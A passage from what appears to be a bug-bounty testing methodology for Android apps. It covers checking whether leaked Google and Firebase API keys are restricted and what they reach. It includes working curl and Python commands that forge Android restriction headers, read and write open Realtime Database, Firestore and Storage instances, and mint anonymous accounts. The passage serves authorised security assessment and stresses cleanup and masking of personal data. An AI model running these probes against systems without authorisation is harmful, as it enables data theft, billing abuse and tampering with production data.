  Read the `reason` codes, not the message text (the text varies, the reason does not):
  * `API_KEY_ANDROID_APP_BLOCKED` ("Requests from this Android client application … are blocked", or Maps `REQUEST_DENIED` with the same text) = **application-restricted**. Ruled-out row; then run D18-011 once.
  * `API_KEY_SERVICE_BLOCKED` = **API-restricted**: this API is not on the key's allow-list. It says NOTHING about application restriction — record app restriction as *not reached*, not *absent*; grep the dex for the `googleapis.com` hosts the app itself calls, re-run (a) against one of those APIs, with and without the forged headers of D18-011.
  * `API_KEY_IP_ADDRESS_BLOCKED` / `API_KEY_HTTP_REFERRER_BLOCKED` = IP / referrer restriction (a web key shipped in the app) — ruled-out row.
  * `ADMIN_ONLY_OPERATION` = the key was **accepted**; only that operation is admin-disabled. Not an application restriction — keep testing other endpoints with this key.
  * `"status": "OK"` with real data, or any 200 carrying a result = **unrestricted from an arbitrary host**. Now determine what it reaches (D18-012) before rating it.
  * `API_KEY_INVALID` / `INVALID_KEY_TYPE` = dead **only if the key is 39 characters and copied verbatim from `file:line`**. Otherwise re-extract — a truncated live, restricted key has been recorded as dead in practice.
- **Proof:** The verbatim vendor error string or success body for each key, pasted into the report — in the negative case as a ruled-out entry, in the positive case as the restriction evidence.
- **Escalation:** Unrestricted -> D18-010 (billing), D18-012 (service surface), D18-028 (enumeration oracle). Restricted -> graveyard row.
- **Ruled out when:** Every recovered key returns the application-restriction string, an invalid-key error, or a 401. That is a *defensible* negative with the exact response recorded. "I did not test it because Firebase keys are public" is not — the key being public by design is precisely why you must test what it reaches.

### D18-010 · Maps / Places / Directions key: test both restriction axes, not one

| | |
|---|---|
| **Severity ceiling** | Medium (High when one key unlocks several billable APIs) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4); rate up on demonstrated multi-API scope and quantified cost |
| **Attacker** | AM-01 |
| **Applies to** | Any app embedding Google Maps/Places; the same two-axis question applies to Mapbox, HERE and Algolia search keys |
| **Requires** | — |
| **Maps to** | `developers.google.com/maps/api-security-best-practices` — Android application restriction = package name + SHA-1 signing certificate fingerprint; separate API restrictions; "You are financially responsible for charges caused by abuse of unrestricted API keys."; Secrets Gradle Plugin |

- **Test:** The Maps key is in `AndroidManifest.xml` or `strings.xml` by construction, so extractability is never the finding. There are two independent controls — *application* restriction (package + SHA-1) and *API* restriction (which services the key may call) — and teams commonly set neither, or only the first.
- **How:**
```bash
grep -rnE 'com\.google\.android\.geo\.API_KEY|com\.google\.android\.maps\.v2\.API_KEY|MAPS_API_KEY|PLACES_API_KEY' \
  $MF $R/values/*.xml
K=AIzaSy...
for u in \
 "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K" \
 "https://maps.googleapis.com/maps/api/place/textsearch/json?query=cafe&key=$K" \
 "https://maps.googleapis.com/maps/api/directions/json?origin=London&destination=Oxford&key=$K" \
 "https://maps.googleapis.com/maps/api/timezone/json?location=51.5,-0.1&timestamp=0&key=$K" \
 "https://roads.googleapis.com/v1/snapToRoads?path=51.5,-0.1|51.51,-0.11&key=$K" ; do
  printf '%s -> %s\n' "${u%%\?*}" "$(curl -s "$u" | jq -r '.status // .error.status // "?"')"
done
```
- **Proof:** `"status": "OK"` with real data from your own machine, carrying no package name and no signing certificate, across **more than one** API. That single table is simultaneously the missing-application-restriction evidence and the missing-API-restriction evidence, and each row is a billed call.
- **Escalation:** Quantify: number of APIs unlocked × the vendor's published per-1000 price, and state that Google documents the customer as financially liable. Quota exhaustion is additionally a functional DoS of the app's map features -> D22.
- **Ruled out when:** Every probe returns `REQUEST_DENIED` with the Android-client-blocked message, i.e. the key is package+SHA-1 restricted. Record the response and stop — the corpus is explicit that this is a ruled-out entry, not a Low finding.

### D18-011 · Show that the package/certificate restriction is client-asserted, not an authentication boundary

| | |
|---|---|
| **Severity ceiling** | Medium |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.pay_per_use_abuse` (P4) |
| **Attacker** | AM-01 |
| **Applies to** | Any Google API key with an Android application restriction |
| **Requires** | — |
| **Maps to** | Google Cloud API key documentation — the Android restriction is enforced from the `X-Android-Package` and `X-Android-Cert` request headers |

- **Test:** The Android application restriction is enforced by two headers the client sends. Both are attacker-supplied and both are recoverable from the APK, so the restriction stops casual abuse but is not an authentication boundary. Demonstrate it once, explicitly, so the report's remediation advice is right (rotate + scope, not "add a package restriction").
- **How:**
```bash
PKG=$(grep -oE 'package="[^"]+"' $MF | head -1 | cut -d'"' -f2)
# keytool -printcert -jarfile reads only the v1 (JAR) signature and prints "Not a signed jar file" on v2/v3-only APKs (the norm at minSdk >= 24): read the signer from the APK Signature Scheme block
CERT=$(apksigner verify --print-certs target.apk | awk -F': ' '/SHA-1 digest/{print $2; exit}' | tr -d ': ' | tr a-f A-F)
[ -n "$CERT" ] || echo 'no signer fingerprint — stop: an empty X-Android-Cert makes the "restriction holds" result an artefact'
K=AIzaSy...
# without the headers
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K" | jq -r '.status'
# with the forged restriction headers
curl -s "https://maps.googleapis.com/maps/api/geocode/json?address=London&key=$K" \
  -H "X-Android-Package: $PKG" -H "X-Android-Cert: $CERT" | jq -r '.status'
```
- **Proof:** `REQUEST_DENIED` without the headers and `OK` with them, side by side. That pair is the whole finding: the restriction is satisfiable by anyone holding the public APK.
- **Escalation:** Where the key also reaches a *data* API (D18-012), this converts a P4 billing item into the data finding's enabler. State it as one sentence in the remediation section of every restricted-key ruled-out entry too.
- **Ruled out when:** The key is also **API-restricted** to services with no data reach and the client accepts the residual billing risk, or the forged-header call still fails (IP restriction in place). Record both call results. Do not file this alone on a program that lists "hardcoded keys, known and expected" as out of scope — it needs the D18-012 data reach to be worth filing.

### D18-012 · Enumerate the full Google service surface a single `AIza…` key unlocks

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when the key reaches an API that returns or mutates data |
| **Attacker** | AM-01 |
| **Applies to** | Every unrestricted `AIza…` key |
| **Requires** | — |
| **Maps to** | Google Cloud API key documentation — an unrestricted key "can be used with all APIs that accept API keys… and can be used from anywhere"; API8:2023 |

- **Test:** "It's just the Maps key" is an assumption. Without an API restriction the key reaches every API in the project that accepts API keys. Enumerate the reach before rating; the corpus's own anti-pattern warning is that over-claiming an analytics key costs credibility, and under-claiming an Identity Toolkit key loses a P1.
- **How:**
```bash
K=AIzaSy...; P=<project_id>
probe(){ printf '%-62s %s %s\n' "${1%%\?*}" "$(curl -s -o /tmp/r -w '%{http_code}' "$@")" "$(head -c 160 /tmp/r | tr '\n' ' ')"; }
probe "https://identitytoolkit.googleapis.com/v1/projects?key=$K"
probe "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:listCollectionIds?key=$K" -X POST -H 'Content-Type: application/json' -d '{}'
probe "https://firebaseremoteconfig.googleapis.com/v1/projects/$P/namespaces/firebase:fetch?key=$K" -X POST -H 'Content-Type: application/json' -d '{"app_instance_id":"probe","app_id":"<google_app_id>"}'
probe "https://generativelanguage.googleapis.com/v1beta/models?key=$K"            # Gemini API — billable per token; the common 2026 leak
probe "https://www.googleapis.com/customsearch/v1?key=$K&q=x"
probe "https://translation.googleapis.com/language/translate/v2?key=$K&q=hi&target=fr"
probe "https://safebrowsing.googleapis.com/v4/threatLists?key=$K"
probe "https://youtube.googleapis.com/youtube/v3/search?part=id&q=x&key=$K"
probe "https://places.googleapis.com/v1/places:searchText?key=$K" -X POST -H 'Content-Type: application/json' -d '{"textQuery":"cafe"}'   # new Places API: 400 (bad field mask) = allowed, 403 = blocked
# FCM v1 takes no ?key= — a 401 there is not a restriction result; the send credential is D18-032
```
- **Proof:** A table of API → HTTP status → first 200 bytes of body. The clearest single piece of evidence is a 200 with data from an API the app demonstrably never calls (it is not in the dex and not in the proxy capture).
- **Escalation:** A reachable Identity Toolkit -> D18-028 enumeration and D18-020 self-enrolment; a reachable Remote Config -> D18-023; a reachable Firestore -> D18-017. Billable-only reach stays at D18-010's rating.
- **Ruled out when:** Every probed API returns `API_KEY_SERVICE_BLOCKED` or the equivalent API-restriction error, proving an API restriction is in force. Record the set you probed — a negative is only as good as the list behind it.

### D18-013 · Decide P5-versus-P1 for every extracted key with an explicit written test

| | |
|---|---|
| **Severity ceiling** | Support (governs every other item's rating) |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.intentionally_public_sample_or_invalid` (P5) vs `…for_publicly_accessible_asset` (P1) vs `…for_internal_asset` (P3) |
| **Attacker** | n/a |
| **Applies to** | Every credential recovered anywhere in this chapter |
| **Requires** | — |
| **Maps to** | Bugcrowd VRT nodes above; Basecamp's carve-out ("hardcoded keys are out unless chained with a demonstrated cross-user impact that does not require physical device access"); Xiaomi's General Assessment Rules ("whether the data or link should have access restricted" and "the sensitivity of the data or link exposed to the public") |

- **Test:** AOSP's own security model rule ① states that all static code and data in an APK "is considered to be public… if an actor publishes the code, this is interpreted as implicit consent to access". So presence is never the finding. Run this four-question test and write the answer into the report.
- **How:** For each key, in order:
  1. **Is it documented by its vendor as a client-side public identifier?** (Firebase Web API key, Stripe `pk_live_`, a package-restricted Maps key, an analytics *ingest* write key.) If yes and it is restricted, it is `…intentionally_public_sample_or_invalid` (P5) → graveyard row, not a report.
  2. **Does it authenticate from an arbitrary host?** One request, per D18-009. If no → P5.
  3. **What does it reach?** Billable API only → `…pay_per_use_abuse` (P4). Internal/staging asset only → `…for_internal_asset` (P3). Production data belonging to users → `…for_publicly_accessible_asset` (P1).
  4. **Write the impact sentence in the report before you pick the severity:** *"This key is not merely present in the binary; using it, an unauthenticated attacker retrieves N customer records, as shown below."* If you cannot write that sentence with a real N, you do not have the P1.
- **Proof:** The four answers, in the report, with the evidence for step 3.
- **Escalation:** Step 4's sentence is the one that converts a P5 into a P1; the corpus names it explicitly as the conversion step. It is also the sentence a triager quotes back when they upgrade.
- **Ruled out when:** Step 1 or step 2 answers "no reach". Then the key belongs in the chapter graveyard with its verbatim vendor response, never in the findings list.

### D18-014 · Firebase Realtime Database: unauthenticated read

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies) for the storage framing |
| **Attacker** | AM-01 |
| **Applies to** | Apps with `firebase_database_url` in resources, or any `*.firebaseio.com` / `*.firebasedatabase.app` host in the package — the string alone does not mean the app uses the store (D18-001 registrar check); probe anyway, report the consumer status |
| **Requires** | firebase |
| **Maps to** | MASTG-KNOW-0039 (Firebase Real-time Databases), MASWE-0004, CWE-306; Firebase insecure-rules documentation (`".read": true, ".write": true`); ATT&CK T1481.002 (ATT&CK names Firebase directly as a C2 channel used by Mandrake, TERRACOTTA and VajraSpy S9006) |

- **Test:** RTDB rules are opt-in. Append `.json` to the instance URL and read it with no credential.
- **How:**
```bash
DB=https://<project>-default-rtdb.firebaseio.com     # or https://<project>.firebaseio.com
curl -s "$DB/.json?shallow=true" -w '\nHTTP %{http_code}\n'      # top-level key names only — start here
curl -s "$DB/.json?print=pretty" | head -60
curl -s "$DB/users.json" | head -c 500
curl -s "$DB/.settings/rules.json" | head -c 300                 # the legacy rules read, if exposed
```
  Start with `?shallow=true`: it returns key names without pulling the dataset, which is both faster and the right first move when you have not yet agreed a data-handling boundary with the program.
- **Proof:** A JSON body of real records returned to a request with no `Authorization` header and no `?auth=` parameter, rather than `{"error":"Permission denied"}`. Characterise the exposure by **record count and field names**, not by dumping the dataset; paste the first records with PII values masked and field names intact.
- **Escalation:** -> D20 mass PII. Mass exposure of multi-user sensitive PII reaches Critical under HackerOne's PII standard. Read access always leads to the write test (D18-015).
- **Ruled out when:** `/.json` returns `{"error":"Permission denied"}`, HTTP 401, or HTTP 404/423 for a deactivated instance — and you also tried the `-default-rtdb` hostname variant and any additional database URL found in the bundle (D18-003), because multi-database projects are common. Record the exact body for each.

### D18-015 · Firebase Realtime Database: unauthenticated write, with marker discipline and cleanup

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); if the write lands on a user-scoped path, `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) |
| **Attacker** | AM-01 |
| **Applies to** | Every RTDB instance found, including ones that deny reads — read and write rules are independent |
| **Requires** | firebase |
| **Maps to** | Firebase insecure-rules documentation; CWE-306 |

- **Test:** Write is strictly more severe than read and the two rules are separate, so a read-denied database can still be world-writable. The corpus is emphatic: always test both.
- **How:**
```bash
DB=https://<project>-default-rtdb.firebaseio.com
M=zq7x4kd2                                     # 8+ char random marker, no English words
curl -s -X PUT -d "\"$M\"" "$DB/pt_$M.json" -w '\nHTTP %{http_code}\n'
curl -s "$DB/pt_$M.json"                       # read it back — this is the proof, not the PUT status
curl -s -X DELETE "$DB/pt_$M.json" -w '\nHTTP %{http_code}\n'   # clean up
curl -s "$DB/pt_$M.json"                       # confirm removal
```
  Marker discipline per D18-070 (8+ random alphanumerics, no English word, no protocol keyword; absent from the baseline read before a write claim).
- **Proof:** The written value returned by an independent `GET`, plus the `DELETE` and the confirming empty read. A `200` on the `PUT` alone is not proof — Firebase returns the written payload on success, but a proxy or CDN can also return 200 for a discarded write.
- **Escalation:** A writable node that the app *reads and renders* is content injection into every install -> D10 WebView / -> D17 dynamic loading. A writable feature-flag or config collection changes app behaviour for every user -> D18-025.
- **Ruled out when:** The `PUT` returns `{"error":"Permission denied"}` on the root and on at least three representative child paths (`/users`, `/config`, and one path name recovered from the dex), and the read-back is empty. A single root-level denial is not enough: RTDB rules cascade downwards from a granting parent but a *denying* parent does not revoke a granting child path, so test child paths explicitly.

### D18-016 · Firebase RTDB cascading-rules pitfall: a denied parent does not protect a granted child

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | RTDB projects that deny the root |
| **Requires** | firebase |
| **Maps to** | Firebase insecure-rules documentation — a parent `".read": true` at `/foo` **cannot** be revoked by `".read": false` at `/foo/bar`; rules cascade downwards only |

- **Test:** Rules grant downwards and never revoke downwards. A project with `".read": false` at the root can still have a permissive subtree, and the root probe in D18-014 will show "Permission denied" while the data is wide open one level down. Recover candidate paths from the app's own code rather than guessing.
- **How:**
```bash
# harvest the paths the app itself addresses
grep -rnE 'getReference\(|child\(|DatabaseReference|FirebaseDatabase\.getInstance' $S/ \
  | grep -oE '"[A-Za-z0-9_/-]{2,40}"' | tr -d '"' | sort -u > rtdb_paths.txt
wc -l rtdb_paths.txt
# sweep them in Python, not a shell array loop, and count the results
python3 - <<'PY'
import urllib.request, json
DB = "https://<project>-default-rtdb.firebaseio.com"
paths = [l.strip() for l in open('rtdb_paths.txt') if l.strip()]
ok = 0
for p in paths:
    try:
        with urllib.request.urlopen(f"{DB}/{p}.json?shallow=true", timeout=10) as r:
            b = r.read(200).decode('utf-8', 'replace')
            print(f"{r.status:4} {p:40} {b[:80]}")
            if r.status == 200 and b not in ('null', ''): ok += 1
    except Exception as e:
        print(f"ERR  {p:40} {e}")
print(f"probed={len(paths)} readable={ok}")
PY
```
- **Proof:** A `200` with data on a child path alongside the `Permission denied` at the root, in the same evidence block. The contrast is what makes the report land.
- **Escalation:** Same as D18-014/-015; additionally, the path names themselves often disclose internal data model and admin subtrees -> D15.
- **Ruled out when:** Every path harvested from the app's own source, plus the conventional set (`users`, `config`, `settings`, `admin`, `messages`, `orders`, `logs`), returns permission-denied. State the probe count and the readable count — an uncounted sweep is not a negative (see D18-070).

### D18-017 · Firestore: unauthenticated read via the REST API

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Firestore projects — note the `.json` probe of D18-014 misses these entirely |
| **Requires** | firebase |
| **Maps to** | Firebase insecure-rules documentation (`allow read, write: if true;`); API1:2023; H1 #731724 (MobiSystems — the REST calls below come from that report) |

- **Test:** Firestore and RTDB are different products with different rules and different endpoints. An app can have a locked RTDB and an open Firestore, and vice versa. Probe Firestore explicitly.
- **How:**
```bash
P=<project_id>; K=<google_api_key>
# the only unauthenticated "is there a Firestore" probe: JSON PERMISSION_DENIED = database exists, rules in force;
# JSON NOT_FOUND "does not exist" = no database; an HTML body = your probe is malformed (a GET on …/documents is not a Firestore route)
curl -s -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:listCollectionIds?key=$K" \
  -H 'Content-Type: application/json' -d '{}' | jq -c '.collectionIds // .error'
# a named collection (harvest names from the dex first)
grep -rnE 'collection\("|collectionGroup\("|FirebaseFirestore' $S/ | grep -oE '"[A-Za-z0-9_-]{2,40}"' | sort -u
curl -s "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents/users?key=$K" | head -c 600
# structured query, which some rule sets allow where the plain list is denied
curl -s -X POST "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents:runQuery?key=$K" \
  -H 'Content-Type: application/json' \
  -d '{"structuredQuery":{"from":[{"collectionId":"users"}],"limit":5}}' | head -c 600
```
- **Proof:** Document bodies returned with no `Authorization` header. Include the document count and field names; mask the values.
- **Escalation:** -> D20; combine with D18-019 if the plain read is denied but an authenticated read is not.
- **Ruled out when:** Only a JSON `PERMISSION_DENIED` body counts; an HTML body or a JSON `NOT_FOUND` is a different state (malformed probe / no database) and is recorded as such. Both `documents:listCollectionIds` and `:runQuery` return `PERMISSION_DENIED` for every collection name harvested from the app's source, *and* the same is true after obtaining an identity per D18-020. A denial without the authenticated retest is an incomplete negative — the `request.auth != null` case (D18-019) is the common one.

### D18-018 · Firestore: unauthenticated document creation and patch

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for a targeted overwrite |
| **Attacker** | AM-01 |
| **Applies to** | Firestore projects |
| **Requires** | firebase |
| **Maps to** | Firebase insecure-rules documentation; H1 #731724 |

- **Test:** Write rules are separate from read rules here too. Create a document in a scratch collection, read it back, delete it.
- **How:**
```bash
P=<project_id>; K=<google_api_key>; M=kt93qp7v
curl -s -X POST \
  "https://firestore.googleapis.com/v1/projects/$P/databases/%28default%29/documents/pt_$M?key=$K" \
  -H 'Content-Type: application/json' \
  -d '{"fields":{"marker":{"stringValue":"'"$M"'"}}}' | jq -r '.name // .error.message'
# read back by the returned document name
curl -s "https://firestore.googleapis.com/v1/<returned-name>?key=$K" | jq .
# delete
curl -s -X DELETE "https://firestore.googleapis.com/v1/<returned-name>?key=$K" -w '\nHTTP %{http_code}\n'
```
  Test writes into a **scratch collection you created**, never into an existing application collection, unless the program's rules explicitly permit it.
- **Proof:** The created document read back at the URL Firestore returned, then the delete confirmation. Say in the report that you wrote one marker document and removed it.
- **Escalation:** Writable Firestore where the app renders content -> D10; writable user documents -> privilege flags on your own record -> D15.
- **Ruled out when:** `PERMISSION_DENIED` on creation in a scratch collection **and** on a `PATCH` against a document you own, tested both unauthenticated and with a self-enrolled identity. Record both.

### D18-019 · The `request.auth != null` rule — any signed-in user reads everyone's data

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `broken_access_control.idor.modify_view_sensitive_information_iterable_object_identifiers` (P1) when documents are addressed by iterable ids; `…modify_view_sensitive_information_guid` (P4) when they are GUID-keyed and you cannot enumerate |
| **Attacker** | AM-01 (self-enrolment) or AM-05 (another user of the same app) |
| **Applies to** | Firestore, RTDB and Cloud Storage projects that pass the unauthenticated probes |
| **Requires** | firebase, two-accounts |
| **Maps to** | Firebase insecure-rules documentation — `if request.auth.uid != null` means "any logged-in user can access all data belonging to other users"; API1:2023 |

- **Test:** This is the most common *serious* Firebase misconfiguration and it is invisible to every unauthenticated scanner. The rule looks defensive (`allow read: if request.auth != null;`) and grants every authenticated identity access to every record, including identities the attacker mints themselves (D18-020).
- **How:**
```bash
# 1. obtain an identity (see D18-020), then:
ID_TOKEN=<idToken from identitytoolkit>
UID=$(echo "$ID_TOKEN" | cut -d. -f2 | base64 -d 2>/dev/null | jq -r '.user_id // .sub')
echo "attacker uid = $UID"
curl -s -H "Authorization: Bearer $ID_TOKEN" \
  "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents/users" | jq '.documents | length'
curl -s -H "Authorization: Bearer $ID_TOKEN" \
  "https://firestore.googleapis.com/v1/projects/$P/databases/(default)/documents/users/<OTHER_UID>" | jq .
curl -s "https://<project>-default-rtdb.firebaseio.com/users.json?auth=$ID_TOKEN" | head -c 400
```
- **Proof:** Your own `uid`, decoded from your token and shown on screen, next to a returned document whose owner field is a **different** `uid`. That juxtaposition is the finding; a 200 alone is not. Leave both uid values visible in the evidence — they are what proves the boundary crossing (see D18-070).
- **Escalation:** Straight to -> D20 mass PII and -> D15 for the same failure on the app's own API. If the writable variant holds, an attacker edits other users' records -> account takeover paths.
- **Ruled out when:** With a freshly minted identity you can read your own document and receive `PERMISSION_DENIED` on a second account's document id — demonstrated with two accounts you control, not inferred. If the collection is GUID-keyed and you genuinely cannot obtain a second id, say so and rate accordingly rather than claiming a negative.

### D18-020 · Self-enrolment: anonymous auth or open sign-up turns "authenticated-only" into "public"

| | |
|---|---|
| **Severity ceiling** | Critical (as the enabler of D18-019; rate the combined chain at the data impact) |
| **VRT** | `broken_authentication_and_session_management.authentication_bypass` (P1) where the rule was the only access control |
| **Attacker** | AM-01 |
| **Applies to** | Firebase Auth projects |
| **Requires** | firebase |
| **Maps to** | Firebase insecure-rules documentation (the `request.auth != null` case); API2:2023 |

- **Test:** If Anonymous auth or open email/password sign-up is enabled on the project, you can mint a project identity yourself with nothing but the API key from the APK. The "authenticated-only" rule then protects nothing. Minting an identity creates a record in the target's production Identity Platform. It is a mutating probe: read-only signal first, mutating probe only under the programme's own-test-account permission (several programmes and every vendor-owned project require explicit approval — write `blocked` otherwise), cleanup always.
- **How:**
```bash
K=<google_api_key>
# 1) read-only: enabled providers — createAuthUri creates nothing
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:createAuthUri?key=$K" -H 'Content-Type: application/json' \
  -d '{"identifier":"probe@example.com","continueUri":"http://localhost"}' | jq '{registered, allProviders, signinMethods, error: .error.message}'
# 2) mutating — only with permission; a WELL-FORMED address on a domain you control (a malformed one returns INVALID_EMAIL before the provider check and proves nothing)
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$K" -H 'Content-Type: application/json' \
  -d '{"returnSecureToken":true}' | jq '{localId, idToken: (.idToken|.[0:24]+"…"), error: .error.message}'                       # anonymous
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:signUp?key=$K" -H 'Content-Type: application/json' \
  -d '{"email":"you+fb1@yourdomain.example","password":"Passw0rd!123","returnSecureToken":true}' | jq '{localId, error: .error.message}'
# 3) cleanup — delete the identity you minted, with its own token
curl -s -X POST "https://identitytoolkit.googleapis.com/v1/accounts:delete?key=$K" -H 'Content-Type: application/json' \
  -d "{\"idToken\":\"$ID_TOKEN\"}" -w '\nHTTP %{http_code}\n'
```
- **Proof:** An `idToken` in the response, then that token successfully reading a Firestore document or Storage object that belongs to a different `uid`. Both halves in one evidence block.
- **Escalation:** Anonymous identities also satisfy any *write* rule gated on `request.auth != null` — test the write with the anonymous token, not only the read.
- **Ruled out when:** `accounts:signUp` returns `ADMIN_ONLY_OPERATION` (sign-up disabled), `OPERATION_NOT_ALLOWED` (that provider is off) or the app-restriction error, and there is no other route to a project identity within scope. Record the exact error for each provider you tried. `INVALID_EMAIL` is inconclusive, never a negative. When the brief forbids account creation, record `blocked` with createAuthUri's `allProviders` as the only read-only signal.

### D18-021 · Firebase Cloud Storage: bucket object listing

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (VARIES — rate on demonstrated data); `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) |
| **Attacker** | AM-01 |
| **Applies to** | Apps with `google_storage_bucket` in resources or any `firebasestorage.googleapis.com` reference — the string alone does not mean the app uses the store (D18-001 registrar check); probe anyway, report the consumer status |
| **Requires** | firebase |
| **Maps to** | Firebase insecure Storage rules (`allow read, write;` → "any internet user can read or write to all files in the bucket"); MASWE-0004 |

- **Test:** Cheapest high-signal probe in the domain. One unauthenticated `GET` against the object-list endpoint. For Storage, **a list is itself the finding** — the object names alone frequently disclose user identifiers, document types and the per-user path scheme.
- **How:**
```bash
B=<project>.appspot.com          # or the firebasestorage.app value from strings.xml
curl -s "https://firebasestorage.googleapis.com/v0/b/$B/o?maxResults=20" | jq '{count: (.items|length), names: [.items[]?.name][0:20]}'
# GCS-level listing for the same bucket
curl -s "https://storage.googleapis.com/$B?maxResults=20" | head -c 800
curl -s "https://storage.googleapis.com/storage/v1/b/$B/o?maxResults=20" | jq '.items[]?.name' | head
# fetch one object named in the listing
curl -s -o /tmp/obj "https://firebasestorage.googleapis.com/v0/b/$B/o/$(python3 -c 'import urllib.parse,sys;print(urllib.parse.quote(sys.argv[1],safe=""))' '<name>')?alt=media" -w '%{http_code} %{size_download}\n'
```
- **Proof:** The object-name listing with its count, plus one retrieved object that is user content rather than a public app asset. Redact the content; keep the key names and the path structure visible.
- **Escalation:** The path structure is an IDOR primitive -> D18-043 and -> D15. Write access -> D18-022.
- **Ruled out when:** The listing endpoint returns `PERMISSION_DENIED` / 403 both unauthenticated and with a self-enrolled identity (D18-020), and a direct `?alt=media` fetch of an object path recovered from the app's source also fails. Note that Firebase Storage objects are commonly served by an unguessable download token appended to the URL — an object that requires `?token=` and is not listable is not a finding, and you should say so explicitly.

### D18-022 · Firebase Cloud Storage: write, overwrite and the download-token model

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `cloud_security.storage_misconfigurations.publicly_accessible_cloud_storage` (varies); `broken_access_control.idor.modify_sensitive_information_iterable_object_identifiers` (P2) for a targeted overwrite |
| **Attacker** | AM-01 |
| **Applies to** | Firebase Storage projects |
| **Requires** | firebase |
| **Maps to** | Firebase insecure Storage rules; CWE-306 |

- **Test:** Write is the higher-severity half and is separately ruled. Also check whether you can overwrite an **existing** object — replacing another user's profile image or document is an integrity finding on top of the disclosure one.
- **How:**
```bash
B=<project>.appspot.com; M=vr48qz1m
# upload to a scratch path
curl -s -X POST "https://firebasestorage.googleapis.com/v0/b/$B/o?name=pt_$M.txt" \
  -H 'Content-Type: text/plain' --data-binary "$M" | jq '{name, downloadTokens: .downloadTokens}'
# read it back, then delete
curl -s "https://firebasestorage.googleapis.com/v0/b/$B/o/pt_$M.txt?alt=media"
curl -s -X DELETE "https://firebasestorage.googleapis.com/v0/b/$B/o/pt_$M.txt" -w '\nHTTP %{http_code}\n'
```
  For overwrite, repeat the upload with `name=` set to an object path you already listed **that you own** — never another user's object.
- **Proof:** The uploaded marker retrieved by an independent `GET`, then the delete. For overwrite, the changed bytes at a path you owned before and after.
- **Escalation:** A writable bucket whose contents the app loads into a WebView, an image view or a dynamic loader is content injection into every install -> D10 / -> D17. If the bucket also serves update artefacts -> D02.
- **Ruled out when:** Upload returns 403 at the bucket root and at the per-user prefix pattern recovered from the app's source, both unauthenticated and with a self-enrolled identity. Record both attempts.

### D18-023 · Remote Config read via the public fetch API

| | |
|---|---|
| **Severity ceiling** | High |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_internal_asset` (P3) for leaked internal endpoints; `…for_publicly_accessible_asset` (P1) if a usable credential is in a parameter value |
| **Attacker** | AM-01 |
| **Applies to** | Apps using Firebase Remote Config |
| **Requires** | firebase |
| **Maps to** | Firebase Remote Config parameters documentation — "Don't store confidential data in Remote Config parameter keys or values"; values are cached on device; API8:2023 |

- **Test:** Remote Config is delivered to every client, so its whole payload is readable by anyone holding the app id and API key. It routinely contains unreleased feature flags, staging hostnames, internal endpoints, third-party keys and business thresholds.
- **How:**
```bash
P=<project_id>; K=<google_api_key>; APPID=<google_app_id>
curl -s -X POST \
  "https://firebaseremoteconfig.googleapis.com/v1/projects/$P/namespaces/firebase:fetch?key=$K" \
  -H 'Content-Type: application/json' \
  -d "{\"app_instance_id\":\"probe\",\"app_id\":\"$APPID\"}" | jq .
# the values the app holds (firebase-config >= 19 persists ConfigContainer JSON under files/): activate = in use, fetch = last fetched
# (may be un-activated), defaults = in-app defaults. Run the glob INSIDE su: the uid-2000 shell cannot expand it
adb shell "su 0 sh -c 'ls -l /data/data/<pkg>/files/ | grep frc_'"
adb shell "su 0 sh -c 'cat /data/data/<pkg>/files/frc_*_firebase_activate.json'" | jq .
adb shell "su 0 sh -c 'cat /data/data/<pkg>/files/frc_*_firebase_fetch.json'" | jq .
```
- **Proof:** The fetched `entries` object, with any internal hostname, unreleased flag name or credential highlighted. Pair it with a follow-up request proving a leaked hostname is live.
- **Escalation:** Leaked endpoints feed -> D15 directly and are frequently a staging API with weaker controls (see D18-068). A credential in a value goes back through D18-013.
- **Ruled out when:** The fetch returns `NO_TEMPLATE` / an empty `entries`, or the project uses no Remote Config (no `…remoteconfig.RemoteConfigRegistrar` in the manifest registrar list of D18-001 and no `files/frc_*` on the device). Note that a per-cohort condition may hide values from your default fetch — D18-026 must also be negative before you record this as ruled out.

### D18-024 · Remote Config used as a secret store — read the values the device actually received

| | |
|---|---|
| **Severity ceiling** | Critical |
| **VRT** | `sensitive_data_exposure.disclosure_of_secrets.for_publicly_accessible_asset` (P1) when a live credential is in a value |
| **Attacker** | AM-01 (fetch API) or AM-11/AM-12 (on-device cache) |
